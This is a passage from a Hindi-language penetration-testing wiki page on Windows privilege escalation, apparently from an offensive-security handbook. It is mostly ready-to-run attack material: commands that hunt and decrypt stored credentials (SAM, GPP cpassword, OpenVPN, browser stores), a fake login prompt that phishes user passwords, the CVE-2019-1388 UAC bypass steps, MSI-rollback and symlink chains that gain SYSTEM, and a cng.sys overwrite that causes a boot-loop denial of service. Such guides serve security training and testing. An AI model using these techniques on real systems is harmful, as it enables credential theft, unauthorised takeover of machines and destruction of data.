dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
आप इन्हें **metasploit**: _post/windows/gather/enum_unattend_ का उपयोग करके भी खोज सकते हैं

Example content:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM backups
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Cloud Credentials
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

**SiteList.xml** नाम की एक फ़ाइल खोजें

### Cached GPP Pasword

पहले एक फीचर उपलब्ध था जो Group Policy Preferences (GPP) के जरिए मशीनों के एक समूह पर custom local administrator accounts deploy करने की अनुमति देता था। हालांकि, इस method में गंभीर security flaws थीं। पहले, Group Policy Objects (GPOs), जो SYSVOL में XML files के रूप में stored होते थे, किसी भी domain user द्वारा access किए जा सकते थे। दूसरे, इन GPPs के भीतर के passwords, जो सार्वजनिक रूप से documented default key का उपयोग करके AES256 से encrypted थे, किसी भी authenticated user द्वारा decrypt किए जा सकते थे। इससे एक गंभीर risk पैदा होता था, क्योंकि यह users को elevated privileges हासिल करने की अनुमति दे सकता था।

इस risk को कम करने के लिए, एक function विकसित किया गया जो locally cached GPP files को scan करता है जिनमें "cpassword" field खाली नहीं होती। ऐसी file मिलने पर, यह function password को decrypt करता है और एक custom PowerShell object return करता है। इस object में GPP और file के location से जुड़ी details शामिल होती हैं, जो इस security vulnerability की पहचान और remediation में मदद करती हैं।

`C:\ProgramData\Microsoft\Group Policy\history` में या _**`C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history` (previous to W Vista)_ में इन files को search करें:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword को decrypt करने के लिए:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexec का उपयोग करके passwords प्राप्त करना:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
credentials के साथ web.config का उदाहरण:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN credentials
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logs
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### क्रेडेंशियल्स के लिए पूछें

आप हमेशा **यूज़र से उसके क्रेडेंशियल्स** या **किसी दूसरे यूज़र के क्रेडेंशियल्स** भी डालने के लिए **पूछ** सकते हैं, अगर आपको लगता है कि वह उन्हें जान सकता है (ध्यान दें कि क्लाइंट से सीधे **क्रेडेंशियल्स** **मांगना** सच में **जोखिम भरा** है):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **credentials वाले संभावित filenames**

Known files that some time ago contained **passwords** in **clear-text** or **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
कृपया सभी प्रस्तावित फ़ाइलों को खोजें:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### RecycleBin में Credentials

आपको इसके अंदर credentials ढूँढने के लिए Bin भी check करना चाहिए

कई programs द्वारा saved **passwords recover** करने के लिए आप use कर सकते हैं: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### registry के अंदर

**credentials वाले अन्य संभावित registry keys**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**registry से openssh keys extract करें।**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Browsers History

आपको उन dbs को check करना चाहिए जहाँ **Chrome or Firefox** के passwords stored होते हैं।\
साथ ही browsers की history, bookmarks और favourites भी check करें, ताकि शायद वहाँ भी कुछ **passwords are** stored हों।

Browsers से passwords extract करने के tools:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** Windows operating system में built-in एक technology है जो different languages के software components के बीच **intercommunication** की अनुमति देती है। हर COM component **class ID (CLSID)** के जरिए identify होता है और हर component एक या अधिक interfaces के जरिए functionality expose करता है, जिन्हें interface IDs (IIDs) से identify किया जाता है।

COM classes और interfaces registry में **HKEY\CLASSES\ROOT\CLSID** और **HKEY\CLASSES\ROOT\Interface** के तहत respectively defined होते हैं। यह registry **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.** को merge करके बनाई जाती है।

इस registry के CLSIDs के अंदर आपको child registry **InProcServer32** मिल सकती है, जिसमें एक **default value** होती है जो **DLL** की ओर point करती है, और **ThreadingModel** नाम का एक value होता है, जो **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) या **Neutral** (Thread Neutral) हो सकता है।

![Browsers History - COM DLL Overwriting: Inside the CLSIDs of this registry you can find the child registry InProcServer32 which contains a default value pointing to a DLL and a value...](<../../images/image (729).png>)

मूल रूप से, अगर आप execute होने वाली किसी भी **DLLs** को **overwrite** कर सकते हैं, तो आप **privileges escalate** कर सकते हैं, यदि वह DLL किसी different user द्वारा execute होने वाली हो।

Attackers COM Hijacking को persistence mechanism के रूप में कैसे use करते हैं, यह जानने के लिए देखें:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**Search for file contents**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**किसी निश्चित filename वाली file खोजें**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**रीजिस्ट्री में key names और passwords खोजें**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### पासवर्ड खोजने वाले टूल्स

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **एक msf** plugin है जिसे मैंने बनाया है ताकि **victim के अंदर credentials खोजने वाले हर metasploit POST module को automatically execute** किया जा सके।\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) इस page में mentioned passwords वाली सभी files को automatically search करता है।\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) system से password extract करने के लिए एक और बढ़िया tool है।

Tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) उन कई tools के **sessions**, **usernames** और **passwords** को search करता है जो इस data को clear text में save करते हैं (PuTTY, WinSCP, FileZilla, SuperPuTTY, और RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

मान लीजिए कि **SYSTEM के रूप में चल रहा एक process नया process open करता है** (`OpenProcess()`) **full access के साथ**। वही process **एक नया process भी create करता है** (`CreateProcess()`) **low privileges के साथ, लेकिन main process के सभी open handles inherit करते हुए**।\
फिर, अगर आपके पास **low privileged process पर full access** है, तो आप `OpenProcess()` से बनाए गए privileged process के **open handle** को पकड़ सकते हैं और **shellcode inject** कर सकते हैं।\
[इस vulnerability को **detect और exploit करने के तरीके** के बारे में अधिक जानकारी के लिए यह example पढ़ें।](leaked-handle-exploitation.md)\
[processes और threads के और अधिक open handlers को different levels of permissions के साथ (सिर्फ full access नहीं) test और abuse करने की अधिक complete explanation के लिए यह **दूसरा post** पढ़ें](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/)।

## Named Pipe Client Impersonation

Shared memory segments, जिन्हें **pipes** कहा जाता है, process communication और data transfer को enable करते हैं।

Windows में **Named Pipes** नाम की एक feature होती है, जो unrelated processes को data share करने देती है, even over different networks. यह client/server architecture जैसी लगती है, जिसमें roles **named pipe server** और **named pipe client** के रूप में defined होते हैं।

जब data एक **client** द्वारा pipe के through भेजा जाता है, तो pipe set up करने वाला **server** **client की identity अपनाने** की ability रखता है, बशर्ते उसके पास जरूरी **SeImpersonate** rights हों। एक **privileged process** की पहचान करना जो ऐसे pipe के through communicate करता है जिसे आप mimic कर सकते हैं, आपको उस process की identity adopt करके **higher privileges हासिल करने** का मौका देता है, जब वह आपके established pipe के साथ interact करता है। ऐसे attack को execute करने के instructions के लिए, helpful guides [**यहाँ**](named-pipe-client-impersonation.md) और [**यहाँ**](#from-high-integrity-to-system) मिल सकते हैं।

साथ ही, निम्न tool **burp जैसे tool के साथ named pipe communication intercept करने** की अनुमति देता है: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **और यह tool सभी pipes को list और देखने देता है ताकि privescs ढूँढे जा सकें** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Telephony service (TapiSrv) server mode में `\\pipe\\tapsrv` (MS-TRP) expose करता है। एक remote authenticated client mailslot-based async event path का abuse करके `ClientAttach` को किसी भी existing writable file पर arbitrary **4-byte write** में बदल सकता है जिसे `NETWORK SERVICE` लिख सके, फिर Telephony admin rights हासिल कर सकता है और service के रूप में arbitrary DLL load कर सकता है। Full flow:

- `pszDomainUser` को writable existing path पर set करके `ClientAttach` करें → service इसे `CreateFileW(..., OPEN_EXISTING)` के through open करती है और async event writes के लिए use करती है।
- हर event attacker-controlled `InitContext` को `Initialize` से उस handle पर write करता है। `LRegisterRequestRecipient` (`Req_Func 61`) के साथ line app register करें, `TRequestMakeCall` (`Req_Func 121`) trigger करें, `GetAsyncEvents` (`Req_Func 0`) से fetch करें, फिर deterministic writes दोहराने के लिए unregister/shutdown करें।
- `C:\Windows\TAPI\tsec.ini` में `[TapiAdministrators]` में खुद को add करें, reconnect करें, फिर `GetUIDllName` को arbitrary DLL path के साथ call करें ताकि `TSPI_providerUIIdentify` as `NETWORK SERVICE` execute हो जाए।

अधिक विवरण:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

पेज **[https://filesec.io/](https://filesec.io/)** देखें

### Protocol handler / ShellExecute abuse via Markdown renderers

Clickable Markdown links जो `ShellExecuteExW` को forward होते हैं, dangerous URI handlers (`file:`, `ms-appinstaller:` या कोई भी registered scheme) trigger कर सकते हैं और attacker-controlled files को current user के रूप में execute कर सकते हैं। देखें:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

जब आप किसी user के रूप में shell प्राप्त करते हैं, तो ऐसे scheduled tasks या अन्य processes हो सकते हैं जो **command line पर credentials pass** करते हैं। नीचे दिया गया script हर दो seconds में process command lines capture करता है और current state की previous state से तुलना करता है, तथा कोई भी differences output करता है।
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## प्रक्रियाओं से पासवर्ड चुराना

## Low Priv User से NT\AUTHORITY SYSTEM तक (CVE-2019-1388) / UAC Bypass

अगर आपके पास graphical interface तक access है (console या RDP के जरिए) और UAC enabled है, तो Microsoft Windows के कुछ versions में एक unprivileged user से terminal या कोई भी दूसरा process जैसे "NT\AUTHORITY SYSTEM" run करना संभव है।

इससे privileges escalate करना और उसी vulnerability के साथ एक ही समय में UAC bypass करना संभव हो जाता है। इसके अलावा, कुछ भी install करने की जरूरत नहीं होती, और process के दौरान इस्तेमाल होने वाला binary Microsoft द्वारा signed और issued होता है।

प्रभावित systems में से कुछ निम्नलिखित हैं:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
इस vulnerability का exploit करने के लिए, निम्नलिखित steps करना ज़रूरी है:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## Administrator Medium से High Integrity Level / UAC Bypass

Integrity Levels के बारे में **जानने के लिए यह पढ़ें**:


{{#ref}}
integrity-levels.md
{{#endref}}

फिर **UAC और UAC bypasses के बारे में जानने के लिए यह पढ़ें:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Arbitrary Folder Delete/Move/Rename से SYSTEM EoP

इस ब्लॉग पोस्ट में वर्णित technique [**इस blog post में**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) और इसका exploit code [**यहाँ उपलब्ध है**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

यह attack मूल रूप से Windows Installer के rollback feature का दुरुपयोग करके uninstall process के दौरान legitimate files को malicious files से replace करने पर आधारित है। इसके लिए attacker को एक **malicious MSI installer** बनाना होता है, जिसका उपयोग `C:\Config.Msi` folder को hijack करने के लिए किया जाएगा, और जिसे बाद में Windows Installer अन्य MSI packages के uninstall के दौरान rollback files store करने के लिए उपयोग करेगा; उन rollback files को malicious payload शामिल करने के लिए modify किया गया होगा।

इस technique का संक्षेप इस प्रकार है:

1. **Stage 1 – Hijack की तैयारी (`C:\Config.Msi` खाली छोड़ना)**

- Step 1: MSI Install करें
- एक `.msi` बनाएं जो एक harmless file (e.g., `dummy.txt`) को writable folder (`TARGETDIR`) में install करे।
- installer को **"UAC Compliant"** के रूप में mark करें, ताकि एक **non-admin user** इसे चला सके।
- install के बाद file पर एक **handle** खुला रखें।

- Step 2: Uninstall शुरू करें
- उसी `.msi` को uninstall करें।
- uninstall process files को `C:\Config.Msi` में move करना और उन्हें `.rbf` files (rollback backups) के रूप में rename करना शुरू करती है।
- `GetFinalPathNameByHandle` का उपयोग करके open file handle को **poll** करें, ताकि पता चले कि file कब `C:\Config.Msi\<random>.rbf` बनती है।

- Step 3: Custom Syncing
- `.msi` में एक **custom uninstall action (`SyncOnRbfWritten`)** शामिल है जो:
- signal करती है जब `.rbf` लिखी जा चुकी हो।
- फिर आगे uninstall जारी रखने से पहले दूसरे event पर **wait** करती है।

- Step 4: `.rbf` की Deletion रोकें
- signal मिलने पर `.rbf` file को `FILE_SHARE_DELETE` के बिना **open** करें — इससे इसे delete होने से **रोक दिया जाता है**।
- फिर वापस **signal** करें ताकि uninstall पूरा हो सके।
- Windows Installer `.rbf` को delete करने में fail हो जाता है, और क्योंकि वह सभी contents delete नहीं कर पाता, **`C:\Config.Msi` remove नहीं होती**।

- Step 5: `.rbf` को मैन्युअली Delete करें
- आप (attacker) `.rbf` file को manually delete करते हैं।
- अब **`C:\Config.Msi` खाली है**, hijack के लिए तैयार।

> इस बिंदु पर, **SYSTEM-level arbitrary folder delete vulnerability** को trigger करके `C:\Config.Msi` delete करें।

2. **Stage 2 – Rollback Scripts को Malicious Ones से Replace करना**

- Step 6: कमजोर ACLs के साथ `C:\Config.Msi` फिर से बनाएं
- `C:\Config.Msi` folder को स्वयं recreate करें।
- **weak DACLs** set करें (e.g., Everyone:F), और `WRITE_DAC` के साथ एक **handle open** रखें।

- Step 7: दूसरा Install चलाएं
- `.msi` को फिर से install करें, साथ में:
- `TARGETDIR`: writable location।
- `ERROROUT`: एक variable जो forced failure trigger करता है।
- यह install rollback को फिर से trigger करने के लिए उपयोग होगा, जो `.rbs` और `.rbf` पढ़ता है।

- Step 8: `.rbs` के लिए Monitor करें
- `ReadDirectoryChangesW` का उपयोग करके `C:\Config.Msi` monitor करें जब तक एक नया `.rbs` दिखाई न दे।
- उसका filename capture करें।

- Step 9: Rollback से पहले Sync करें
- `.msi` में एक **custom install action (`SyncBeforeRollback`)** शामिल है जो:
- event signal करती है जब `.rbs` बन जाती है।
- फिर आगे बढ़ने से पहले **wait** करती है।

- Step 10: Weak ACL फिर से लागू करें
- `.rbs created` event मिलने के बाद:
- Windows Installer `C:\Config.Msi` पर **strong ACLs** फिर से apply करता है।
- लेकिन क्योंकि आपके पास अभी भी `WRITE_DAC` वाला handle है, आप **weak ACLs** फिर से apply कर सकते हैं।

> ACLs केवल handle open होने पर enforce होती हैं, इसलिए आप फिर भी folder में write कर सकते हैं।

- Step 11: Fake `.rbs` और `.rbf` डालें
- `.rbs` file को एक **fake rollback script** से overwrite करें जो Windows को बताता है कि:
- आपकी `.rbf` file (malicious DLL) को एक **privileged location** में restore करे (e.g., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`)।
- अपनी fake `.rbf` drop करें जिसमें एक **malicious SYSTEM-level payload DLL** हो।

- Step 12: Rollback Trigger करें
- sync event signal करें ताकि installer resume करे।
- एक **type 19 custom action (`ErrorOut`)** configure की गई है जो जानबूझकर install को एक ज्ञात point पर fail करती है।
- इससे **rollback शुरू** होता है।

- Step 13: SYSTEM आपका DLL install करता है
- Windows Installer:
- आपकी malicious `.rbs` पढ़ता है।
- आपकी `.rbf` DLL को target location में copy करता है।
- अब आपके पास आपकी **malicious DLL एक SYSTEM-loaded path में** है।

- Final Step: SYSTEM Code Execute करें
- एक trusted **auto-elevated binary** चलाएं (e.g., `osk.exe`) जो आपके hijacked DLL को load करता है।
- **Boom**: आपका code **SYSTEM** के रूप में execute होता है।


### Arbitrary File Delete/Move/Rename से SYSTEM EoP

मुख्य MSI rollback technique (पिछली वाली) यह मानती है कि आप एक **पूरा folder** delete कर सकते हैं (e.g., `C:\Config.Msi`)। लेकिन अगर आपकी vulnerability केवल **arbitrary file deletion** की अनुमति देती है, तो ?

आप **NTFS internals** का exploit कर सकते हैं: हर folder में एक hidden alternate data stream होता है called:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
यह stream folder के **index metadata** को स्टोर करता है।

इसलिए, अगर आप किसी folder के **`::$INDEX_ALLOCATION` stream** को **delete** करते हैं, तो NTFS filesystem से **पूरे folder** को हटा देता है।

आप इसे standard file deletion APIs का उपयोग करके कर सकते हैं, जैसे:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> भले ही आप एक *file* delete API कॉल कर रहे हों, यह **folder को ही delete कर देता है**।

### Folder Contents Delete से SYSTEM EoP
अगर आपका primitive arbitrary files/folders को delete करने नहीं देता, लेकिन यह **attacker-controlled folder के contents को delete करने** की अनुमति देता है तो क्या होगा?

1. Step 1: एक bait folder और file setup करें
- Create: `C:\temp\folder1`
- इसके अंदर: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` पर एक **oplock** लगाएँ
- जब कोई privileged process `file1.txt` को delete करने की कोशिश करता है, तो oplock **execution को pause** कर देता है।
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Step 3: SYSTEM process को ट्रिगर करें (e.g., `SilentCleanup`)
- यह process folders (e.g., `%TEMP%`) को scan करता है और उनकी contents को delete करने की कोशिश करता है।
- जब यह `file1.txt` तक पहुंचता है, तो **oplock triggers** होता है और control आपके callback को hand over हो जाता है।

4. Step 4: oplock callback के अंदर – deletion को redirect करें

- Option A: `file1.txt` को कहीं और move करें
- इससे `folder1` खाली हो जाता है बिना oplock को break किए।
- `file1.txt` को सीधे delete न करें — इससे oplock prematurely release हो जाएगा।

- Option B: `folder1` को **junction** में convert करें:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Option C: `\RPC Control` में एक **symlink** बनाएं:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> यह NTFS internal stream को target करता है जो folder metadata store करता है — इसे delete करने पर folder delete हो जाता है।

5. Step 5: Release the oplock
- SYSTEM process जारी रहता है और `file1.txt` को delete करने की कोशिश करता है।
- लेकिन अब, junction + symlink की वजह से, यह वास्तव में इसे delete कर रहा है:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**परिणाम**: `C:\Config.Msi` को SYSTEM द्वारा हटा दिया जाता है।

### Arbitrary Folder Create से Permanent DoS तक

एक primitive exploit करें जो आपको **SYSTEM/admin के रूप में arbitrary folder create** करने देता है — भले ही **आप files लिख न सकें** या **weak permissions set** न कर सकें।

एक **folder** (file नहीं) बनाएं, जिसका नाम किसी **critical Windows driver** के नाम पर हो, जैसे:
```
C:\Windows\System32\cng.sys
```
- यह path आमतौर पर `cng.sys` kernel-mode driver से संबंधित होता है।
- अगर आप इसे **पहले से folder के रूप में बना दें**, तो Windows boot पर actual driver load करने में fail हो जाता है।
- फिर Windows boot के दौरान `cng.sys` load करने की कोशिश करता है।
- उसे folder मिलता है, **actual driver resolve करने में fail होता है**, और **crash हो जाता है या boot halt** हो जाता है।
- यहाँ **कोई fallback नहीं** है, और external intervention के बिना **कोई recovery नहीं** होती (जैसे boot repair या disk access)।

### privileged log/backup paths + OM symlinks से arbitrary file overwrite / boot DoS

जब कोई **privileged service** एक **writable config** से पढ़े गए path पर logs/exports लिखता है, तो **Object Manager symlinks + NTFS mount points** के साथ उस path को redirect करके privileged write को arbitrary overwrite में बदला जा सकता है (यहाँ तक कि **SeCreateSymbolicLinkPrivilege** के बिना भी)।

**Requirements**
- target path store करने वाला config attacker के लिए writable हो (जैसे `%ProgramData%\...\.ini`)।
- `\RPC Control` पर mount point और OM file symlink बनाने की क्षमता हो (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools))।
- एक privileged operation जो उस path पर लिखती हो (log, export, report)।

**Example chain**
1. config पढ़कर privileged log destination निकालें, जैसे `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` in `C:\ProgramData\ICONICS\IcoSetup64.ini`।
2. बिना admin के path को redirect करें:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. प्रतीक्षा करें कि privileged component log लिखे (जैसे, admin "send test SMS" ट्रिगर करता है)। अब write `C:\Windows\System32\cng.sys` में land होता है।
4. overwritten target (hex/PE parser) को inspect करें ताकि corruption confirm हो सके; reboot Windows को tampered driver path load करने पर मजबूर करता है → **boot loop DoS**। यह किसी भी protected file पर भी लागू होता है जिसे privileged service write के लिए open करेगा।

> `cng.sys` normally `C:\Windows\System32\drivers\cng.sys` से load होता है, लेकिन अगर `C:\Windows\System32\cng.sys` में copy मौजूद है तो उसे पहले attempt किया जा सकता है, जिससे यह corrupt data के लिए एक reliable DoS sink बन जाता है।



## **High Integrity से System तक**

### **New service**

यदि आप पहले से High Integrity process पर चल रहे हैं, तो **SYSTEM तक का path** आसान हो सकता है — बस **एक नया service create और execute** करके:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> जब कोई service binary बनाएं, तो सुनिश्चित करें कि वह एक valid service है, या फिर binary आवश्यक actions बहुत जल्दी पूरा करती हो, क्योंकि यदि वह valid service नहीं है तो 20s में उसे kill कर दिया जाएगा।

### AlwaysInstallElevated

High Integrity process से आप **AlwaysInstallElevated registry entries को enable** करने और _**.msi**_ wrapper का उपयोग करके एक reverse shell **install** करने की कोशिश कर सकते हैं।\
[Registry keys और _.msi_ package install करने के बारे में अधिक जानकारी यहाँ है।](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

